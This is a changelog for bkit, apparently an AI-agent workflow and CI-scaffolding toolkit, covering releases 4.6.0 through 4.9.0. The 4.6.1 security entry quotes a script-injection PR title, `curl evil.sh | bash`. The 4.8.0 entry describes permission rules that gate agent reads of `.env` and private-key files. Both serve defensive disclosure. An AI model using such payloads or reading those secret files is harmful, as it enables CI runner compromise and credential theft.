- **CI scaffold: always-on migration lane owns remote `db push` (#385).** Mirrors the consumer (gether #451) contract: `bkit-tests-migration` stays always-on (no job-level `if:`); replay stays plan-/path-gated per-step; remote `db push --linked --include-all` moves out of e2e / the legacy `supabase-migrate` stub into the migration lane (push to `dev`/`main` only, un-gated by `run_migration` for self-heal); `bkit-tests-e2e` / `-live` `needs:` migration with `result != 'failure'`; capstone asserts migration `success` whenever scope succeeded. Docs (`testing.md` / `deployments.md`), FULL CI SCAFFOLD REFERENCE, and postinstall advisories updated. Local integration: prefer reset-by-default `test:integration:local` over bare turbo (documented pattern; consumer supplies the script).
- **Cursor defaults are first-party only (`cursor-grok-4.5-high` / `composer-2.5`) (#205).** Shipped Cursor pins no longer use the API pool (Claude / GPT / Fable), so workflows keep running when API credits are exhausted. Depth + synthesizer + `/design`/`/plan`/`/debug` orchestrators → Grok; volume + `/build`/`/ship` → Composer. API-pool restore: `prompts.md` § Model Overrides carries a ready-to-paste Opus block (Claude-opus-tier → `claude-opus-5-thinking-high`; no Cursor Sonnet — leave sonnet/haiku on Composer/Grok or optionally `gpt-5.6-sol-high`). Docs: `providers.md` catalog, README model labels.
- **`bkit check` fails on host agent/command mirror content drift.** Mirror would-writes (and orphan deletes) now enter `ws.writes`, so a hand-edited agent/command with an intact managed-version marker exits 1 — not only the marker-stale path. README / KN-33-era comments updated. (surfaced by the 4.9.0 pre-release audit)
- **Full/core uninstall strips `package.json` `bkit` install-state.** Tracker / provider / dep-updater / cloud / runners preferences no longer linger after teardown (scripts/devDeps still need `--package`). (surfaced by the 4.9.0 pre-release audit)
- **CLI help and README name `opencode-zen` / `opencode-go`.** Bare `opencode` remains a legacy alias only; help Supported list and the `opencode-setup` advisory copy match the allowlist. (surfaced by the 4.9.0 pre-release audit)

### Fixed

- **Planned `/bkit-audit` catalog note clarifies stub names.** `@bkit-audit-*` planned prompts are distinct from shipped `@bkit-utility-audit-*` utilities. (surfaced by the 4.9.0 pre-release audit)

---

## [4.8.0] — 2026-07-22

Makes workflow retry-counting deterministic — attempt counters now derive from `status.jsonl` instead of model-tracked prose — and expands the OpenCode host with first-class Zen and Go built-in providers alongside the install-drift fixes that surfaced beside them. Consumers can now redirect managed CI to their own runners, ledger slugs are collision-checked on install, and the OpenCode host gains the same secret-file read guardrails the Claude host already enforced.

### Added

- **Configurable CI runners for the managed Renovate and cloud workflows.** A new `bkit.runners` map substitutes the `runs-on` label (default `ubuntu-latest`) into `renovate.yml` and `bkit-cloud.yml`, so a consumer can point them at Depot / larger / self-hosted runners without tripping the canonical drift gate. (#362)
- **First-class OpenCode Zen and Go built-in providers.** `opencode-zen` and `opencode-go` are now modelled as OpenCode builtins (apiKey only) rather than generic openai-compatible blocks, so per-model Anthropic-vs-openai-compatible routing works; a reinstall heals a hijacked provider block, and agents pin to `opencode/*` / `opencode-go/*` from the central `prompts.md` table. (#371)
- **Ledger slug identity is validated and normalised.** Doctrine already retired the sequential `DE-N` / `KN-N` alias scheme; a loud collision scan, a postinstall advisory, and an idempotent normaliser now stop a legacy-seeded ledger from re-arming the duplicate-slug race. (#361)

### Changed

- **Workflow retry counters derive from `status.jsonl`, not model-tracked prose.** Every attempt counter (VERIFY / TEST / CHALLENGE_REMEDIATE / DEBUG / NORMAL / SOAK / MERGE) is now counted deterministically by the shell from step-done rows in the active run, replacing the inline `jq` prelude across the five workflows with a single-sourced fold (`bkit-status-fold.sh`). Caps, routing, and retry semantics are unchanged — only the number's provenance moves from long-context prose to the status bus. `decide_next` / `check_max` fail closed on empty or non-integer input, and every call site routes a non-0/1 exit to the Failure Path. (#58)
- **Seeded E2E CI describes PR/push parity, not `@smoke` tiering.** The seeded `ci.yml` and `docs/testing.md` no longer advise running an `@smoke` subset on PRs with the full suite only on push — a tiering that let a real consumer's rendering regression slip through every PR and surface only post-merge. The templates now describe PR/push E2E parity (scale a slow suite by sharding, not subsetting); the separate `@live` push-only tier and the migration-coupled DB divergence stay documented exceptions.
- **Refreshed model pins.** Cursor cross-family agent slots pin to `cursor-grok-4.5-high`, and the OpenCode Go opus slot pins to `minimax-m3` for the 5-hour window. (#205)
- **Shipped prompts, workflows, and docs get a wording / formatting pass** with the host mirrors regenerated, and the `.gitignore` template (and bkit's own) now ignore Claude Code's live `.claude/worktrees/` directory.

### Fixed

- **`bkit check` no longer reports perpetual drift on `.opencode/opencode.json` and `.bkit/version`.** Two pre-existing causes from the #371 provider work made check exit 1 on every run (blocking the pre-push and CI drift gates): the JSON was prettier-linted in the repo but bkit renders canonical single-line JSON (now prettier-ignored, like `.mcp.json`), and the upgrade "additional providers" loop reordered provider keys so install and upgrade never converged (the render now preserves the existing provider key order). (#371)
- **Cursor and OpenCode command mirrors rewrite an `Invoke @agent` reference to the `/agent` slash form.** The host rewrite only matched bare `**Subagent:** @name` lines, so the slash-form rewrite never fired for the `Invoke @agent` form real workflows use; the shared rewrite is widened and the mirrors refreshed.
- **Install no longer appends duplicate managed blocks.** Prose version stamps are ignored and a broken marker never triggers an append, so duplicate managed blocks stop compounding on every install.
- **The workflow close-gate grader actually runs.** `bkit comply` accepts only `--phase=<value>`, but the telemetry script and ship close-gate passed the space form `--phase <value>` behind a fail-open `|| skip`, so the grader silently no-opped on every run since 4.7.0 and wrote no `compliance` rows. All call sites now use the equals form. (surfaced by the 4.7.0 pre-release audit)
- **The debug workflow runs without an FID or plan.** `YYYYMM` now defaults to the current UTC month when no feature bucket is found, instead of stranding a debug run that has none.
- **Two postinstall advisories stop firing false positives.** `tagged-tests-no-ci-home` now masks string / comment regions so a `@live` inside a fixture string literal is not counted as a real tagged test, and `test-integration-env-not-asserted` recognises real-service env provisioned at the CI lane or the vitest integration config, not only the script string. (#360)
- **The unit test lane is genuinely subprocess-free.** Every unit-suffixed test that spawns a real subprocess is reclassified to `*.integration.test.ts`, the coverage table no longer hides fully-covered files (vitest 4.x auto-forced `skipFull` under agent detection), and `docs/testing.md`'s Unit tier row is reworded to match. (#374 #375)
- **The `bkit uninstall` example no longer over-claims "zero footprint."** The short help line now states that generated artefacts (`.bkit/advisories.md`, `.bkit/friction.jsonl`) are kept and `--nuke` purges them, matching the detailed help and the deliberate preserve-artefacts behaviour. (surfaced by the 4.8.0 pre-release audit)

### Security

- **The OpenCode host now gates secret-file reads, matching the Claude host.** `.opencode/opencode.json` shipped `"read": "allow"`, overriding even OpenCode's own default `.env` denial — so an OpenCode-run agent could read `.env` / `*.pem` / `*.p12` / `id_rsa` unprompted while the Claude host asked or denied. The `read` permission is now a per-path map that asks on `.env` / `.env.*` (allowing `.env.example`) and denies private-key material, closing the cross-host guardrail asymmetry. (surfaced by the 4.8.0 pre-release audit)

## [4.7.0] — 2026-07-19

Generalises the workflow telemetry that landed in 4.6.0 from a build-only summary into a per-workflow run ledger every phase emits, and overhauls the plan template to be documentation- and stack-agnostic so it reads the same in any consumer repo. Two workflow/CLI fixes round it out: a dirty primary checkout no longer strands a worktree cut, and `bkit check`'s help text plus a bare `bkit` invocation now match documented behaviour.

### Added

- **A reusable workflow-telemetry script.** `.bkit/scripts/bkit-workflow-telemetry.sh <workflow> <yyyymm> <fid>` centralises the run-row write, the `bkit comply` grade, and the summary emit for the design / plan / build / debug workflows — one command in place of four divergent inline-bash blocks (ship keeps its own richer inline write). (records #234)

### Changed

- **Telemetry is now a per-workflow run row, rendered as a Markdown table at Close.** The build-only `outcome` summary generalises to a run row keyed by repo + workflow + parent SHA (`prNumber` optional), and every workflow's Close Workflow step now emits `THIS run vs med·5` — the rolling median of the previous five same-workflow runs — as a Markdown table into the MCP tracker comment, with per-run `frictionAdded` / `deferralsAdded` / `failuresAdded` deltas. Each workflow captures its own base SHA at start so it diffs only its own change, and the summary moved out of `*-summary.md` into the titled tracker comment (Artifacts / Telemetry subheadings). (records #234)
- **The plan template is documentation- and stack-agnostic.** `docs/plans/template.md` names only the core, universal docs inline (everything else resolves through `.agents/docs.md`), drops doc-section anchors, and demotes stack tools to `e.g.` examples — so it reads the same whatever a consumer's docs layout or stack is. It now also reflects the universal `rules.md` guarantees (anti-suppression + blast-radius CRITICALs, `[NEW]`-must-justify-vs-extend reuse discovery, deferrals/failures ledgers, the full local gate suite, human-gated Open Questions), shifts audit discrimination left into the test matrix, and adds a `Process Sketch` (WHEN X then Y) form for acceptance scenarios and edge cases. Alerts render as boxes and the year is a `{current year}` placeholder. (#354 #355 #356)
- **A new-file Write now draws a reuse / anti-duplicate advisory.** GateGuard (the `.claude` + `.opencode` mirrors) nudges toward extending an existing module before adding a new file — branching on the non-existent path — while the existing hook contract is unchanged.
- **`docs/design.md` is restored as a core shipped doc.** Reverses its earlier removal: the template and the `.agents/docs.md` row are back, and `bkit install` auto-seeds it.
- **`bkit check` help and a bare `bkit` invocation match documented behaviour.** The help text no longer claims `bkit check` unconditionally "Exits 1 on drift" — it exits 1 only when a managed file needs re-rendering, while Tier-3 seed-or-print drift (e.g. `ci.yml`) stays a non-blocking advisory (exit 0), matching `docs/deployments.md`. A bare `bkit` with no command now prints usage and exits 2 (usage error) instead of 0; an explicit `bkit help` / `--help` still exits 0.

### Fixed

- **A dirty or unpushed primary checkout no longer halts a worktree cut.** Design / plan / build Step 2 now states explicitly that a dirty or unpushed primary must not halt or route to the Failure Path — cut `feat/{FID}` off `origin/dev` and proceed — instead of an agent bailing at a dirty tree before it has even started.

## [4.6.3] — 2026-07-16

Follows the 4.6.2 pre-release audit's two remaining advisory-only findings — and a broader realisation from running `bkit check` against real consumers (gether, fraser): bkit was flagging content drift on managed CI blocks that consumers legitimately own and customise.

### Changed

- **Managed-block drift is now a presence check, not exact-match.** `bkit check` flagged `drifted: <block>` whenever a consumer's bkit-managed `ci.yml` block differed from the shipped template byte-for-byte — even when the consumer had every required line and merely added their own, reordered, re-indented, or wrapped the marker around a different span. A real consumer hit this with its three `verbose-ci-env` env vars **byte-identical** to the template, drifting only because it placed the bare `env:` key just outside the marker. On a Tier-3 file bkit never rewrites, that is perpetual noise on every consumer that customises its own CI. Drift now fires only when a REQUIRED line — real bkit content, excluding comments, bare structural YAML keys (`env:`), and per-consumer `{{TOKEN}}` placeholders — is MISSING from the consumer's block. "All the content and more" stays quiet; a genuinely dropped or edited required line still gates.
- **`ts-ci-steps` is fully consumer-owned.** The `optional` block flag (only `ts-ci-steps` carries it) now suppresses **drift as well as "missing"** — it IS the consumer's Node/TS toolchain region (the template says "adapt these to your stack"), so enforcing its content was noise. The critical gates it wraps (`bkit check`, `slop:delta`, actionlint, registry auth) each have their own dedicated presence advisory, so nothing is lost. Supersedes 4.6.2's per-line placeholder wildcard for this block.

### Fixed

- **`.bkit/version` was orphaned by a full uninstall.** bkit's own install-state manifest (pinnedVersion + tier3Hashes) records no hash for itself, so the byte-equal hash-guard preserved it as "consumer-modified" — leaving bkit state behind after a full teardown. It is now removed on a full/core uninstall (bkit-authored state, never consumer content); a targeted `uninstall --claude` still leaves it so bkit keeps working for the modules that remain.

## [4.6.2] — 2026-07-16

Continues the post-4.6.x reconciliation against the source-of-truth consumer: closes the gap where 4.6.1's script-injection fix — shipped only into new `ci.yml` seeds — never reached existing consumers, and retires three perpetual or false advisories that a hand-maintained Tier-3 CI surfaced. Also scrubs maintainer-internal tracker ids from the shipped telemetry spec.

### Security

- **`ci-yml-run-injection` — a dedicated script-injection advisory for consumers 4.6.1's fix never reached.** 4.6.1 hardened the shipped `ci.yml` template, but `ci.yml` is Tier-3 seed-or-print, so the fix does not back-fill a consumer seeded before it — they keep the vulnerable `MSG="${{ github.event.pull_request.title }}"` with only a generic block-drift nudge (not a security signal). A new detector pattern-matches untrusted input (`${{ github.event.* }}` / `github.head_ref`) interpolated directly into a `run:` shell body — the actual sink — separate from cosmetic drift, and prescribes the `env:`-indirection remediation. Line-based (no YAML dependency): the safe `env:` / `if:` form does not fire and shipped commented stubs stay silent, and the current template is asserted never to trip its own detector.

### Changed

- **`ts-ci-steps` is now an `optional` managed block.** A consumer that hand-maintains its own setup / install / typecheck steps outside the block was perpetually nagged `missing: ts-ci-steps` — a block a Tier-3 `ci.yml` (never rewritten) can never regain, so the advisory could never be resolved. Marked `optional`: a deleted block no longer nags, while a block that is present-but-drifted is still flagged. The skeleton derivation still recognises the marker.
- **Managed-block drift ignores comments, rendered `{{TOKEN}}` placeholders, and the opt-out skeleton.** `bkit check`'s Tier-2 / Tier-3 named-block drift compared full block bodies, so three false positives fired perpetually on a file bkit never rewrites: (a) a consumer annotating a bkit-owned block (a ticket ref, a rationale) tripped drift; (b) EVERY correctly-installed consumer drifted on a rendered placeholder line (`node-version: {{NODE_VERSION}}` → `node-version: 22`, since the compare used the raw template); (c) a `--ci`-only consumer drifted on the intentionally-commented `ts-ci-steps` skeleton. Now only semantic lines are compared, a `{{TOKEN}}` line is a per-consumer wildcard (`${{ … }}` GitHub Actions expressions still gate), and an `optional` block a consumer emptied to comments is treated as opted out. A changed or commented-out semantic line still gates.
- **`ci-legacy-scaffold-job-names` surfaces the docs-vs-CI skew.** When `docs/testing.md` (managed, refreshed on upgrade) already names the current jobs while a Tier-3 `ci.yml` still defines the legacy `bkit-decide` / `bkit-tests-migrate` jobs, the advisory now states that docs and CI describe **different** job names — the skew becomes a stated finding instead of one an agent has to notice.

### Fixed

- **The shipped docs leaked maintainer-internal tracker ids.** `.bkit/jsonl.md`'s `references` examples cited real internal `BAR-###` ids (which resolve to bkit's private tracker) — the same class of leak the 4.6.0 "workflow must never cite an internal label" rule forbids — and the illustrative `BAR-###` in `.bkit/trackers.md`, `.bkit/workflows/bkit-design.md`, and `.bkit/workflows.md` did the same. All are now neutral `ISSUE-###` / `TEAM-###` placeholders; the generic `KN-N` / `DE-N` legacy-ledger scheme, which consumers reuse, is unchanged.
- **A full `bkit uninstall` orphaned 100%-bkit files.** `.opencode/opencode.json` was left holding bkit's `mcp` + `provider` blocks (a `{env:GH_BKIT_TOKEN}`-referencing config), and the `.claude` / `.cursor` `preflight.sh` hooks plus `.cursor/rules/00-shared-rules.mdc` were left as dead shells — bkit's own header stripped down to a husk. opencode.json's scope-strip now renders the template's `@@…@@` sentinel keys with the consumer's own tracker + provider before comparing (so the rendered `github` / provider keys line up and strip), and a markered-text file whose post-strip residual equals the shipped scaffold is deleted rather than left as a husk. A consumer who added content outside the block still strips unequal → preserved.

## [4.6.1] — 2026-07-16

A post-release audit of the two surfaces 4.6.0's pre-release audit ran out of turns on — uninstall footprint and guardrail parity — surfaced a script-injection in the shipped CI template and two uninstall-footprint gaps. Also syncs the CI scaffold and testing doctrine with the source-of-truth consumer's cross-lane file-execution report.

### Security

- **The shipped `ci.yml` template interpolated the PR title into a shell `run:` body, allowing script injection on a consumer's CI runner.** Both `Detect Direct Push` steps expanded `${{ github.event.pull_request.title }}` straight into the script text, so a PR titled `"; curl evil.sh | bash; "` executed on the runner (with `GH_TOKEN` in step env). bkit's own `ci.yml` already used the injection-safe `env:` pattern — the fix had never reached the template it ships. The title (plus `github.event_name` / `github.ref`) now arrives through `env:` at both sites, and a test asserts the inline form stays gone so a snapshot update cannot silently reintroduce it. `ci.yml` is Tier-3 seed-or-print, so existing consumers are **not** auto-rewritten — re-seed or hand-apply the `env:` pattern to your `Detect Direct Push` steps.

### Fixed

- **A full `bkit uninstall` orphaned bkit's own doctrine files and scripts.** `.agents/{config,docs,rules,skills}.md` and `.bkit/scripts/bkit-*` install via the core templates pass, not the manifest, so no uninstall verb could reach them — a full teardown left bkit's canonical rules and helper scripts behind. They are now removed on a full/core uninstall: the doctrine `.md` via strip-block (preserving any consumer content below `bkit:end`, exactly like the root `AGENTS.md`), the scripts by glob. A targeted `uninstall --tooling` / `--claude` still leaves core untouched, and `--nuke` removes everything.
- **Uninstall left empty bkit-authored directories behind.** `.claude/agents`, `.github/workflows`, `.husky`, `.vale/styles/House`, `.bkit/scripts` and their siblings are now pruned when the deletions leave them empty — deepest-first, and only when a directory is genuinely empty, so one still holding consumer files is never touched.

### Changed

- **CI scaffold + testing doctrine reference the cross-lane file-execution report.** The `bkit-tests-check` capstone is the only job that `needs:` every lane, so it is the only place to catch a test file that has stopped running in _every_ lane — renamed out of its glob, moved to a lane whose filter excludes it, or left on a stale `skipIf` — where each lane stays green, the per-tier count still looks plausible, and the coverage is silently gone. The scaffold's capstone gains a suggestion comment for the optional, non-blocking report (reconcile the on-disk test-file inventory against the union of files executed across all lanes; full-runs-only; report-then-assert), and `docs/testing.md` § "Validated means executed" gains the matching doctrine. The capstone's assertion prose now also lists `build` as a result-only lane (no `*_ran` count).

## [4.6.0] — 2026-07-16

Hardens the workflow kernel and the JSONL telemetry ledgers that landed in 4.5.0, and adopts a measured consumer's flat CI lane DAG. Running the ledgers against live consumer repos turned up defects the ledgers themselves recorded: ship merged a PR to `dev` while CI was concluding **failure** (a 403'd status query was silently graded a pass), merged work could be stranded unrecoverable past the point of no return, concurrent runs of _different_ features corrupted each other's `dev` operations with zero per-FID contention, and every compliance row bkit has ever written graded an **empty diff**. Telemetry rows gain the provenance and severity needed to slice them, and five divergent inline-bash summaries collapse into one command. Separately, a consumer measured their pipeline at 26.7 → 11.0 min (−59%) — the shipped CI scaffold now reflects what that measurement actually found.

### Added

- **Repo-global `dev` lock — serialises cross-FID critical sections (issue [#99](https://github.com/cbartens/bkit/issues/99)).** The per-FID lock only ever guarded two runs of the _same_ feature, but every collision observed in practice was **cross-FID**: concurrent runs of different features share `dev`, the main working tree, `.git/config`, and `.bkit/stats.jsonl`, and corrupt each other while contending for nothing. A new `$REPO_ROOT/.bkit/.dev.lock` (gitignored, live + template) is held only across a _dev critical section_ — any block that checks out, stages, commits, or pushes `dev` in the main checkout: design + plan close-squash, and ship Steps 6, 9, 13 plus the Failure Path. `build` / `debug` take no lock (they close via PR and never touch `dev`), and all worktree-phase work stays fully parallel. Acquire is atomic via `set -C` (`O_EXCL`) — the prior `> "$LOCK"` truncate-creates and cannot arbitrate, and a race test had **8 of 8** concurrent runs "acquire" it. 900s stale threshold, 600s wait budget; the Failure Path waits 60s and then _skips_ its dev ops rather than hard-failing.
- **`bkit telemetry summary [--phase=<workflow>]`.** All five workflow close steps now call one command instead of each carrying its own inline-bash summary. The bash was the live path and was wrong in three ways: `grep -c … || echo 0` printed `0\n0` in the _common_ case (grep exits 1 on zero matches), `jq '.bkitVersion // "unknown"'` bucketed empty versions under an empty key (`//` substitutes only on null/false), and one used a regex as a JSON parser. An already-tested `buildSummary()` existed and was called by nothing.
- **Telemetry provenance and severity.** `step` had silently absorbed agent identity and did it inconsistently (81 rows carried an _agent name_ as `step`, 4 a real step) while `subagent` sat empty on **0 of 141** rows — so neither dimension was sliceable. Split into three fields answering three questions: `step` = where, `subagent` = who, `model` = the subagent's own frontmatter pin (never set on orchestrator rows). `severity` (`CRITICAL|HIGH|MEDIUM|LOW`) is now required on friction / deferral / failure rows and rejected on the other five kinds, and `TRIAGED` extends to all three triaged kinds. Enforcement is **write-only** — `parse()` stays tolerant, so pre-severity rows still read and existing ledgers are unaffected.
- **`ci-legacy-scaffold-job-names` advisory.** Fires on an _uncommented_ `bkit-decide` / `bkit-tests-migrate` job key in `.github/workflows/ci.yml` and prescribes the rename below (including the `id: decide` → `id: scope` step edit). It stays silent on the commented scaffold reference, so carrying the template raises nothing. The failure it prevents is real and silent: the CI-Dispatch Gate polls the pushed HEAD for a `bkit-tests-*` check, so a repo on a differently-named planner matches nothing and the gate reports `no-ci` on **every build** while losing its ability to catch a genuinely undispatched run.
- **`bkit-tests-build` scaffold stub.** Splits the workspace compile into its own lane. Documented against itself: it buys **~0 wall-clock** and is worth adopting for time-to-signal only. Not a test tier — it emits no `<tier>_ran` and the capstone asserts `result` alone.
- **Lane DAG + per-lane resource matrix in `docs/testing.md`** (managed block, ships on upgrade). States as a _rule_, not a description, that `bkit-tests-live` is the only lane permitted to spend real external quota and that only `-live` and push-side `-e2e` may touch a shared long-lived instance — everything else provisions its own state, which is precisely what makes a flat DAG viable, since lanes owning their state cannot contend. Adds the **live-API / remote-DB axis split**: "real external API" and "real remote backing service" are two independent axes and must never be one flag. Collapsing them into a single overloaded gate left **10 suites needing only a real DB — zero external API — stranded in the serial push-only `@live` lane**, invisible on PRs and inflating the exact lane that gated CI; rehoming them took `@live` from 86 to 44 tests and gave those suites PR coverage they had never had. Also documents the lane-move trap (a `skipIf` left on a suite whose new lane never sets that var skips **forever**, green and silent) and the honest-skip rule.
- **Vendored-skill ignores in `slop-scan.config.json`** (live + template). Installed skills are third-party code you neither own nor will fix, but slop-scan scanned them as source — inflating the score and making any newly added skill read as net-new slop in `slop:delta`. Matches the vendored-skill exemptions already shipped for prettier and Vale.

### Changed

- **Commit and push doctrine split in `.agents/rules.md`** (managed block — this changes how agents behave in every consumer repo). Was a single `NEVER commit / push unprompted`. Now **commits** are `ALWAYS commit early and often; NO human confirmation required`, bounded by a hard staging rule — only files you touched, never blanket-stage unrelated tree state, `git add -A` only in dedicated worktrees where the whole tree _is_ the task. **Pushes** keep the human-request bar, with pushes mandated inside a `/bkit-*` workflow step pre-approved. Gates are reinterpreted in the same pass: gates inside `/bkit-*` workflows are self-verification, not human gates — STOP only at explicit HARD STOPs (design/plan and production merge). Where confirmation is unavailable inside a workflow, append a `BLOCKED` row to `docs/deferrals.jsonl` and continue; never self-authorize the opt-out.
- **Docs-only commit marker is now `bkit [skip ci]`**, and the rule simplifies to "only on commits carrying no code".
- **Flat lane DAG and ungated `@live` in the shipped CI scaffold reference (issue [#347](https://github.com/cbartens/bkit/issues/347)).** Every lane now fans out from one root (`bkit-tests-scope`), so wall-clock equals the slowest single lane. `@live` loses its `needs: [every test lane]` + `success` gate — a consumer measured that one edge at **~600s ≈ 35% of wall-clock**, and it buys close to nothing: `@live` is push-only, a push is post-merge and already PR-validated (0 of 30 sampled pushes had a static/unit/build failure), and a non-compiling tree still cannot false-green because `@live`'s own build fails and reds the lane. The cost is wasted external-API spend on the rare broken push — re-gate only if your spend flips it, and measure first. The migration replay lane re-parents onto the planner for ordering and stays unconditional. The scaffold also gains a **measure-the-graph-before-optimising-it** doctrine block (all setup-cost levers on the measured consumer totalled ~52s ≈ 3%) and a runner-size note: a bigger runner bills at a higher per-minute rate and buys **literally zero** aimed at a non-pole lane (measured at +0.0 min).
- **Scaffold job renames: `bkit-decide` → `bkit-tests-scope`, `bkit-tests-migrate` → `bkit-tests-migration`.** **Not breaking, and nothing in your repo is rewritten** — `ci.yml` is Tier-3 seed-or-print, so bkit seeds it once and never touches it again; only new seeds get the new names. **Branch protection is unaffected**: the sole required check remains `bkit-tests-check`, and neither renamed job is a required check. Renaming is optional and surfaced by the advisory above. Note that `docs/testing.md`'s managed block _does_ update on upgrade, so its prose will name the new jobs while an un-migrated `ci.yml` still defines the old ones. Advisory ids were deliberately **not** renamed — the `# bkit-stub:<id>` sentinel lives in your `ci.yml`, so renaming ids would silently orphan existing sentinels and stop their nudge firing. Because `bkit-tests-scope` is the planner sitting in the `bkit-tests-*` namespace, a capstone looping over "every `bkit-tests-*` lane" would skip it and leave a scope failure green; the trap is documented at the capstone and in the scaffold.
- **Workflow authoring rules: no internal labels, and bash decides while prose routes.** A workflow must never cite an internal label (`DE-25`, `KN-11`, `#261`) — consumers receive the workflow but not the doc defining the label, and a coined replacement name still makes the reader hold a definition. Prose branches on a fenced block's **exit code**, never on a restatement of the domain condition. Rationale moves into `.bkit/workflows.md`. Honestly: this is not a size win — total workflow bytes went 393,995 → 401,014 (+1%); the strip freed budget the new gates consumed. Every doc template gains the matching rule: describe current state, not reasons or history.
- **`bkit harvest` now prunes, and its store moved to `harvest/` at the repo root** (bkit-repo-only verb). It still copies `stats.jsonl` untouched, but now **moves** `friction.jsonl` — pruning harvested rows from the consumer repo, so the store is the only copy until committed (hence tracked, outside `.bkit/`, which is bkit's managed install surface). The prune is gated byte-for-byte and never on identity (the fold collapses colliding rows, so an identity-gated prune would delete every colliding row), runs only after copy → fsync → read-back, never touches malformed lines, and writes via temp-file + rename so an interrupt cannot tear the ledger.

### Fixed

- **Ship merged a PR to `dev` while CI was concluding failure (issue [#99](https://github.com/cbartens/bkit/issues/99)).** Two independent causes compounded. `gh pr view --json statusCheckRollup` returned a GraphQL **403** (PAT scope) and the gate treated the failed query as a **pass**; and the check was stale by merge time anyway, since `gh pr update-branch` moves the head immediately before `gh pr merge`, so nothing had ever validated the SHA actually being merged. Ship now re-resolves CI against the head about to merge, refuses on anything short of `completed` + `success`, and treats a query failure as **NOT VALIDATED, never as a pass**. A companion gate item that asserted a guard deleted in the same window — and was therefore unpassable — is removed.
- **Ship could strand merged work with no path to recovery.** The Step 6 merge is a point of no return, but later steps hard-exited past it into a Failure Path that added `bkit:failed` additively while label reconciliation never ran — leaving the issue at `bkit:ship` + `bkit:failed` with the work already on `dev`. Re-running could not recover it: `gh pr list` defaults to OPEN, so a merged PR was invisible and ship died on an empty `PR_NUMBER`. Ship now queries `--state all`, prefers OPEN then MERGED (never a stale CLOSED), routes MERGED straight to the post-merge step, makes the merge idempotent, and makes the Failure Path merge-aware. A racy `RUN_ID` guard (30s sleep against Actions queue latency, a strictly worse duplicate of the later `--commit $SQUASH_SHA` lookup) is deleted. **The live tier is a canary, not a merge gate** — `@live` is push-only, so it cannot exist at merge time and could never have informed the merge decision.
- **The CI-Dispatch probe reported `no-ci` on every build for consumers who renamed their planner.** The anchor `test("decide"; "i")` was chosen specifically to survive a renamed planner and failed at exactly that: a consumer's `bkit-tests-scope` carries no "decide" substring, so the probe matched nothing, the gate self-healed once per build with a spurious empty commit, and — the real cost — lost its ability to catch a genuinely undispatched run. Re-anchored on the **namespace** (`test("bkit-tests|decide"; "i")`): any `bkit-tests-*` check answers "did CI dispatch for this HEAD", with `decide` retained for un-migrated consumers. Widening to "any check" was rejected — a preview / Renovate / cloud-agent check would report `dispatched` when CI never fired.
- **Every `bkit comply` diff-based rule graded an empty diff and passed vacuously.** The parent-SHA resolver scanned `.bkit/stats.jsonl` for the most recent `workflow-started` row carrying a `parentSha` — a row that **cannot exist there**: `workflow-started` is a `status.jsonl` event, while `stats.jsonl` holds compliance / outcome / counter rows, of which only compliance and counter carry `parentSha` and both were explicitly skipped by the loop. The loop therefore never matched, the literal `"HEAD~1"` always won, and since the diff helper guards on a SHA regex and returns empty otherwise, every diff-based rule graded **nothing** while still writing a row saying "pass". Worse, `parentSha` is part of row identity, so every run folded into the same identity and the history silently collapsed. Now resolves `HEAD~1` (falling back to `HEAD`) and skips the grade when unresolvable. Previously-green compliance grading can now legitimately report findings.
- **Regression analysis marked every run after a repo's first-ever bug as an error run, forever.** The check tested the **cumulative** `outcome.failures > 0` absolutely, flattening the size signal to 100% error at every bucket. A new `newFailuresThisRun()` computes per-run new failures as a per-repo delta, clamped at 0 for duplicate-key triage sweeps. Ship's own count also moved to distinct-key `jq` counting — `wc -l` over a cumulative ledger double-counted a failure the moment a triage close appended a same-key row.
- **A pathspec-less `git commit` swept the user's staged work.** Both `git add` _and_ `git commit` now carry pathspecs at all three main-checkout sites plus the Failure Path.
- **Every plan and design close died** on a STRAY-artifact guard that had not been updated for the `friction.md` → `friction.jsonl` rename.
- **The per-FID lock could delete a live lock.** A TOCTOU plus a missing/empty `status.jsonl` fell through to `rm -f` during the 30–120s window before Step 2 writes any status. Now guarded with an mtime fallback.
- **Fresh worktrees branched from local `HEAD`, not `origin/dev`.** Design, plan, and build all fetched `origin/dev` and then ignored it, so a fresh run off a stale local `dev` started stale.
- **Artifact assertions could pass against the wrong tree.** The check was tree-agnostic ("exists and is non-empty"); all 36 sites now resolve the artifact under the working directory the dispatch supplied rather than trusting the subagent's reported path. Design and plan additionally assert no `{FID}` artifact is left untracked in the main checkout before the close squash — reproduced live as `untracked working tree files would be overwritten`.
- **A stale `mergeable=CONFLICTING` from GitHub's cache aborted ship spuriously.** Now discriminated with `git merge-tree --write-tree`.
- **A tracker switch told you to add the new MCP server but never to drop the old one.** The install path resolved `issueTracker` — including the `--tracker=` override — roughly seventy lines _after_ it ran preflight, so the tracker-dependent detectors graded whatever was already on disk and never saw the flag. On the run that switched `linear` → `github`, preflight graded `linear`: `mcp-extra-server-linear` was suppressed (the linear tracker allows the linear server) while `mcp-missing-server-github` still fired (the linear tracker requires the github server too). The switching run therefore told you to add `github` and stayed silent about the now-unused `linear` entry left pointing at Linear's endpoint. Preflight now resolves the tracker before it runs and grades the tracker the run installs. The detectors were always correct in isolation, which is why the tests missed it — the new regression test drives the real CLI.
- **`bkit telemetry summary` was missing from `bkit help`**, discoverable only by reading the error text of an invalid sub-verb.
- **Docs corrected against real behaviour.** `bkit doctor` was advertised as writing no files while it (like `bkit check`) regenerates the `.bkit/advisories.md` artifact, creating `.bkit/` if absent — the write is by design, the claim was not, and `doctor` printed "no writes" immediately before printing "Wrote .bkit/advisories.md". Stale ledger references left by the `.md` → `.jsonl` migration are also fixed (`.bkit/friction.md`, `docs/knowledge.md`, `docs/decisions.md`).
- **The published tarball carried bkit's own ledgers and a local-path file into every consumer's `node_modules`.** `files[]` excluded `!.bkit/friction.md`, but the ledger migration renamed it to `.jsonl` and the exclusion silently stopped matching — so `.bkit/friction.jsonl` (bkit's own friction rows) and `.bkit/stats.jsonl` shipped, alongside `.bkit/consumers.md`, which was never excluded at all and contains absolute filesystem paths to the maintainer's local repos. Nothing was ever seeded into a consumer's tree — the files sat unused in `node_modules` — so this is hygiene, not breakage. Present since the ledger migration; all three are now excluded.

---

## [4.5.0] — 2026-07-14

